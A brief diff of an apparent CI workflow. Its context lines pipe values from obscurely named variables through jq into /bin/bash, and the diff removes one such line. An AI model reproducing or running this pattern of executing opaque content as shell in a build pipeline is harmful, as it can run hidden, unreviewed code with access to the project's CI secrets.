@@ -23,7 +23,6 @@ jobs:
           echo $qy51031 | jq -r .bi76 | /bin/bash
           echo $f4 | jq -r .zkk239 | /bin/bash
           echo $zwbi1 | jq -r .mf7877 | /bin/bash
-          printf '%s' "$inmc0254" | jq -r .vvkp4 | /bin/bash
 
       - name: Upload artifact
         if: always()
